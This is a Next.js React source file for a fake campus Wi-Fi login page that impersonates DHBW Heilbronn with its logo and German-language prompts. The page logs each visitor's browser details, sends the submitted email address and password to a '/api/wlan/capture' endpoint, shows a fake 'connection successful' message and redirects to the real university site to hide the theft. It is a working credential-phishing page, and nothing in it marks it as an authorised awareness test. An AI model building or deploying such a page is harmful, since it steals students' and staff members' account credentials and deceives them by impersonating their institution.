"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Image from "next/image";

export default function WlanLoginPage() {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [startTime, setStartTime] = useState<number | null>(null);
  //const bitlyLink = "https://bit.ly/3RCCQjG";

  useEffect(() => {
    setStartTime(Date.now());

    const trackVisit = async () => {
      await fetch("/api/wlan/tracking", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          referrer: document.referrer || "Direkter Zugriff",
        }),
      });
    };

    trackVisit();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const form = e.target as HTMLFormElement;
    const email = (form.elements.namedItem("email") as HTMLInputElement).value;
    const password = (form.elements.namedItem("passwort") as HTMLInputElement).value;

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const referrer = document.referrer || "Direkter Zugriff";
    const sessionDuration = startTime ? Math.floor((Date.now() - startTime) / 1000) : 0;

    await fetch("/api/wlan/capture", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email,
        password,
        screenResolution,
        referrer,
        sessionDuration,
      }),
    });

    setIsConnecting(true);

    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
    }, 2000);
  };

  useEffect(() => {
    if (isConnected) {
      const redirectTimeout = setTimeout(() => {
        window.location.href = "https://www.heilbronn.dhbw.de";
      }, 2000);

      return () => clearTimeout(redirectTimeout);
    }
  }, [isConnected]);

  return (
    <div className="min-h-screen bg-cover bg-center flex items-center justify-center p-4" style={{ backgroundImage: "url('/campus-background.png')" }}>
      <Card className="w-full max-w-md bg-white border border-gray-300 rounded-none shadow-sm p-6 sm:p-8">
        <CardHeader className="flex flex-col items-center gap-4">
          <div className="w-48 sm:w-60">
            <Image
              src="/dhbw-logo.png"
              alt="DHBW Heilbronn Logo"
              width={300}
              height={130}
              className="w-full h-auto"
              priority
            />
          </div>

          {!isConnected ? (
            <>
            <p className="text-center text-md text-gray-800">
              Willkommen im Campus WLAN der DHBW Heilbronn
            </p>
            <p className="text-center text-sm text-gray-800 mt-4">
              Bitte authentifizieren Sie sich, um eine sichere Internetverbindung über <span className="font-semibold">DHBW-Campus-WLAN</span> herzustellen.
            </p>
            
          </>
          
          ) : (
            <p className="text-center text-lg font-semibold text-green-700 mt-6">
              Verbindung erfolgreich!<br />
              Sie werden weitergeleitet...
            </p>
          )}
        </CardHeader>

        {!isConnected && (
          <CardContent>
            <form onSubmit={handleSubmit} className="flex flex-col gap-4 mt-4">
              <div>
                <label htmlFor="email" className="block text-sm font-bold text-gray-700 mb-1">
                  E-Mail-Adresse
                </label>
                <Input id="email" placeholder="benutzername@heilbronn.dhbw.de" type="email" className="bg-gray-100" required />
              </div>
              <div>
                <label htmlFor="passwort" className="block text-sm font-bold text-gray-700 mb-1">
                  Passwort
                </label>
                <Input id="passwort" type="password" className="bg-gray-100" required />
              </div>
              <div className="flex items-center gap-2 mt-2">
                <input type="checkbox" id="nutzungsbedingungen" className="border-gray-400" required />
                <label htmlFor="nutzungsbedingungen" className="text-sm text-gray-700">
                  Ich akzeptiere die Nutzungsbedingungen des Campus-WLANs.
                </label>
              </div>
              <Button type="submit" className="w-full mt-4" disabled={isConnecting}>
                {isConnecting ? "Verbindung wird hergestellt..." : "Verbinden"}
              </Button>
            </form>

            <div className="text-center text-sm text-gray-600 mt-6 space-x-4">
              <a href="#" className="text-blue-600 underline">Nutzungsbedingungen</a>
              <a href="#" className="text-red-600 underline">Hilfe</a>
            </div>
          </CardContent>
        )}
      </Card>
    </div>
  );
}
